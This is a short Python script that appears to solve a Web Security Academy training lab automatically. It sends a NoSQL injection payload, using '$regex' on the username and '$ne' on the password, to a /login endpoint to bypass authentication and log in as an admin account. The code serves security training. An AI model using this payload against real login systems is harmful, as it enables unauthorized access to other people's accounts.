from web_security_academy.core.logger import logger
from re import match


def solve_lab(session):
    json = {"username": {"$regex": "admin"}, "password": {"$ne": "wrong-password"}}
    logger.info("Sending a POST request to /login with the following JSON:")
    logger.info(json)
    resp = session.post_path("/login", json=json, allow_redirects=False)

    if resp.status_code != 302:
        logger.failure("Failed to log in.")
    else:
        location = resp.headers["Location"]
        username = match(r"/my-account\?id=(.*)", location).group(1)
        session.get_path(location)
        logger.success(f'Successfully logged in as "{username}"')
